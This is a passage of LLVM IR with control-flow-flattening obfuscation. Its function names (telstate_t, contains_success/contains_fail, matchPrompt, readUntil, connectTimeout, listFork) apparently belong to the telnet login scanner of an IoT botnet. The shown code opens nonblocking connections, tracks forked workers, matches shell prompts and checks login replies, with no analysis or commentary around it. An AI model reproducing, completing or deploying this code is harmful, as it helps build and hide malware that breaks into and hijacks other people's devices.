  store i32 1728468685, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1662814656, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 808988757, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 808988757, label %first
    i32 -1722344875, label %8
    i32 -16769979, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 -1722344875, i32 -16769979
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 -16769979, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1067557755, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1067557755, label %first
    i32 -1386974820, label %7
    i32 2105364910, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 2105364910, i32 -1386974820
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 2105364910, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1598017667, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1598017667, label %first
    i32 -879599476, label %37
    i32 1140199388, label %38
    i32 232427201, label %47
    i32 -1243064997, label %52
    i32 480351712, label %57
    i32 -2013307918, label %66
    i32 1851314058, label %83
    i32 758188238, label %90
    i32 407220830, label %91
    i32 636178096, label %92
    i32 -197342886, label %93
    i32 534324417, label %94
    i32 1362953148, label %95
    i32 350733097, label %96
    i32 -1197116330, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -879599476, i32 1140199388
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1197116330, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 232427201, i32 350733097
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 -1243064997, i32 534324417
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 480351712, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -2013307918, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 1851314058, i32 636178096
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 758188238, i32 407220830
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1197116330, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -197342886, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1197116330, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 1362953148, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1197116330, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 350733097, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -1197116330, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 828916881, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 828916881, label %first
    i32 442479836, label %9
    i32 -1464909273, label %11
    i32 -1053224212, label %19
    i32 1674026068, label %26
    i32 -216059932, label %36
    i32 980196375, label %39
    i32 -638759838, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 442479836, i32 -1464909273
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -638759838, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -1053224212, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 1674026068, i32 980196375
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 -216059932, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -1053224212, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #2
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -638759838, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.345, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 2022690098, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2022690098, label %11
    i32 -1320225674, label %18
    i32 742935608, label %19
    i32 1130231180, label %24
    i32 1709127004, label %37
    i32 -1691271694, label %50
    i32 1454029105, label %63
    i32 1079575301, label %75
    i32 -1221732443, label %76
    i32 -570172596, label %78
    i32 2049098796, label %81
    i32 1254182518, label %100
    i32 2035509878, label %101
    i32 -104279927, label %102
    i32 1554343541, label %105
    i32 -538211374, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -1320225674, i32 1554343541
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 742935608, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 1130231180, i32 -1221732443
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 1079575301, i32 1709127004
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 1079575301, i32 -1691271694
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 1079575301, i32 1454029105
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 1079575301, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1221732443, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 -570172596, i32 2049098796
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 742935608, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 1254182518, i32 2035509878
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -538211374, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -104279927, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 2022690098, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -538211374, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 110916817, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 110916817, label %33
    i32 -136067606, label %39
    i32 -227203287, label %44
    i32 332773649, label %48
    i32 947350838, label %49
    i32 259941107, label %51
    i32 1884834183, label %52
    i32 -1814518272, label %61
    i32 1536592204, label %78
    i32 -736444521, label %79
    i32 2062698129, label %91
    i32 -1525627372, label %95
    i32 936440468, label %96
    i32 -268244748, label %105
    i32 -741210901, label %114
    i32 565610550, label %118
    i32 560365056, label %119
    i32 1384828417, label %128
    i32 -1033486029, label %129
    i32 1007642696, label %130
    i32 -740712131, label %136
    i32 -1639776528, label %140
    i32 109639907, label %145
    i32 712516613, label %146
    i32 -1690173937, label %147
    i32 -1904686157, label %148
    i32 2103851316, label %152
    i32 26685610, label %153
    i32 524829097, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 -136067606, i32 947350838
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 332773649, i32 -227203287
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 332773649, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 947350838, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 259941107, i32 -1904686157
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 1884834183, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #2, !srcloc !5
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 -1814518272, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
